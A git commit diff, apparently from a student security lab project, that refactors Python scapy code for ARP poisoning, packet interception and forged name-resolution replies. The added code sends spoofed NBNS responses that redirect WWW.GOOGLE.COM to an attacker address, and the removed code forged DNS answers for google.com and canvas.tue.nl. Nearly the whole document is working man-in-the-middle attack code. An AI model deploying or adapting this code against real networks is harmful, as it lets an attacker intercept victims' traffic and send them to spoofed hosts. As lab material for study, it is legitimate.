156a3a29c1687fe7ccce76422cece835b19e2d25
JeroenJoao <jeroenstruijk@protonmail.com>
2020-03-20 16:06:49 +0100

    dns spoof working

--- arpForward.py
+++ arpForward.py
@@ -1,15 +1,34 @@
-from time import sleep
-
 from scapy.all import *
-from scapy.layers.inet import IP, TCP
-import threading
-from threading import Lock
 import arpSpoof
 import util
 import interceptor
-import dnsSpoofing
 
-lock = Lock()
+
+class Arp():
+    def __init__(self, networkInterface, victimIP, spoofIP):
+        self.networkInterface = networkInterface
+        self.victimIP = victimIP
+        self.spoofIP = spoofIP
+        self.attackerMAC = get_if_hwaddr(networkInterface)
+        self.victimMAC = util.getMAC(victimIP, networkInterface) # get victim MAC adress
+        self.serverMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP]  # get array of MAC of poisoned ips in victim arp table
+        self.interceptedPkt = []
+
+    def startSniff(self):
+        sniff(prn=self.intercept, iface=self.networkInterface, filter="ip", timeout = 20)
+
+    def intercept(self, pkt):
+         interceptor.interceptARP(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC, self.victimMAC, self.networkInterface)
+
+    def spoof(self):
+        arpSpoof.arpPoisoning(self.victimIP, self.spoofIP, self.networkInterface)
+
+    def start(self):
+        while (True):
+            self.spoof()
+            self.startSniff()
+
+
 networkInterface = "enp0s3"
 victimIP = "192.168.56.101"
 #victimMAC = "08:00:27:b0:a1:ab"
@@ -17,58 +36,6 @@ victimIP = "192.168.56.101"
 spoofIP = "192.168.56.102"
 #serverMAC = "08:00:27:c6:a4:61"
 
+test = Arp(networkInterface, [victimIP], [spoofIP])
 
-
-# input : attacker MAC as str
-# -target ip which has posioned arp tables  as str
-# - array of ips which were posioned in victim table as array of str
-# - network interface as str
-# output:
-# - send replay packet which will perform MIMA as follows
-# - attacker will receive request from victim ip
-# - performe that request and receive response from dst ip
-# - and then send that resposne to the victim ip
-
-class sniffer():
-    def __init__(self, networkInterface, victimIP, spoofIP, attackerMAC):
-        self.networkInterface = networkInterface
-        self.victimIP = victimIP
-        self.spoofIP = spoofIP
-        self.attackerMAC = attackerMAC
-        self.victimMAC = util.getMAC(victimIP, networkInterface) # get victim MAC adress
-        self.serverMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP]  # get array of MAC of poisoned ips in victim arp table
-        self.interceptedPkt = []
-
-    def startSniffArp(self):
-        sniff(prn=self.interceptARP, iface=networkInterface, filter="ip", timeout = 20)
-
-    def startSniffDNS(self):
-        sniff(filter="udp port 53", iface=networkInterface, prn=self.interceptDNS, store=0, timeout = 20)
-
-    def interceptARP(self, pkt):
-         interceptor.interceptARP(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC, self.victimMAC, self.networkInterface)
-
-    def dnsResponse(self, pkt, hostIP, mac):
-        dnsSpoofing.dns_call(pkt, hostIP, mac, self,networkInterface, self.attackerMAC)
-
-    def interceptDNS(self, pkt):
-        pkt, hostIP, mac =interceptor.interceprDNS(pkt, self.networkInterface)
-        self.dnsResponse(pkt, hostIP, mac)
-
-    def spoofARP(self):
-        arpSpoof.arpPoisoning(self.victimIP, self.spoofIP, self.networkInterface)
-
-
-
-    def startARP(self):
-        while (True):
-            test.spoofARP()
-            test.startSniffArp()
-
-    def startDNS(self):
-        while (True):
-            test.spoofARP()
-            test.startSniffDNS()
-test = sniffer(networkInterface, [victimIP], [spoofIP], get_if_hwaddr(networkInterface))
-
-test.startDNS()
+test.start()
--- dnsSpoofing.py
+++ dnsSpoofing.py
@@ -1,64 +1,43 @@
 from scapy.all import *
-from scapy.layers.dns import DNS, DNSQR, DNSRR
-from scapy.layers.inet import IP, UDP, TCP
-import util
-import arpSpoof
+from scapy.layers.inet import IP, UDP
+from scapy.layers.netbios import NBNSQueryRequest, NBNSQueryResponse
+
+
+class Dns():
+
+    def __init__(self,networkInterface, victimIP, spoofedWebsites):
+        self.networkInterface = networkInterface
+        self.victimIP = victimIP
+        self.spoofedWebsites = spoofedWebsites
+
+
+    def startSniffing(self):
+        sniff(prn=self.sendFakeResponse, iface=self.networkInterface, filter="port 137", timeout=1)
+
+
+    def sendFakeResponse(self, pkt):
+        if pkt.haslayer(NBNSQueryRequest) and pkt[IP].src == self.victimIP:
+            print(pkt[NBNSQueryRequest].QUESTION_NAME + " is being requested.")
+            if pkt[NBNSQueryRequest].QUESTION_NAME in self.spoofedWebsites.keys():
+                print(pkt[NBNSQueryRequest].QUESTION_NAME + " is being redirected to " + self.spoofedWebsites.get(pkt[NBNSQueryRequest].QUESTION_NAME))
+                etherLayer = Ether(src=get_if_hwaddr(self.networkInterface), dst=pkt[Ether].src)
+                ipLayer = IP(src=pkt[IP].src, dst=pkt[IP].src)
+                udpLayer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
+                nbnsResponse = NBNSQueryResponse(NAME_TRN_ID=pkt[NBNSQueryRequest].NAME_TRN_ID,
+                                                 RR_NAME=pkt[NBNSQueryRequest].QUESTION_NAME,
+                                                 QDCOUNT=0, ANCOUNT=1, NSCOUNT=0, ARCOUNT=0, NB_ADDRESS=self.spoofedWebsites.get(pkt[NBNSQueryRequest].QUESTION_NAME))
+                poisonedPaket = etherLayer / ipLayer / udpLayer / nbnsResponse
+
+                sendp(poisonedPaket, verbose=0, iface=self.networkInterface)
+
+    def start(self):
+        while(True):
+            self.startSniffing()
+
 
 networkInterface = "enp0s3"
-
 victimIP = "192.168.56.101"
-victimMAC = "08:00:27:b0:a1:ab"
+spoofedWebsites = {"WWW.GOOGLE.COM" : "192.168.56.102"}
 
-serverIP = "192.168.56.102"
-serverMAC = "08:00:27:c6:a4:61"
-
-# attackerIP = get_if_addr(networkInterface)
-# attackerMAC = get_if_hwaddr(networkInterface)
-
-
-#input :
-#catched packet which will be replaced
-#host ip adresse for poisoning - target of attacker
-#network interfase as string
-#output:
-#method will send fake dns packet , victim will think that server has replied while
-#the attacker will be the one who replies to the victim
-
-
-#list of websites for redirecting
-redirect_to ={
-    b"www.google.com" : "192.168.56.102",
-    b"google.com" : "192.168.56.102",
-    b"canvas.tue.nl" : "192.168.56.102",
-    b"www.canvas.tue.nl" : "192.168.56.102"
-
-}
-def fake_dns_response(pkt, hostIP, networkInterface, attackerMAC):
-    hostMAC = util.getMAC(hostIP, networkInterface)
-    dns = Ether(src = attackerMAC, dst = hostMAC)/\
-          IP(dst = hostIP, src = pkt[IP].dst) /\
-          UDP(dport = pkt[UDP].sport, sport = pkt[UDP].dport) /\
-          DNS(id = pkt[DNS].id, acount = 1, qr = 1, rd =1, qd = pkt[DNS].qd,
-              an = DNSRR(rrname = pkt[DNSQR].qname, type ='A', rclass = pkt[DNSQR].qclass, ttl = 86400, rdata = redirect_to[pkt[DNSQR].qname]))
-    dns.show()
-
-    sendp(dns, iface = networkInterface, verbose = False)
-
-def dns_call(pkt, hostIP, mac, networkInterface, attackerMAC):
-    website = pkt[DNSQR].qname
-    if mac == attackerMAC:
-        return
-
-    if website not in redirect_to:
-        print("no modification needed : " + website)
-        pkt.show()
-        return
-    else:
-          fake_dns_response(pkt, hostIP, networkInterface, attackerMAC)
-
-
-
-
-
-
-
+test = Dns(networkInterface, victimIP, spoofedWebsites)
+test.start()
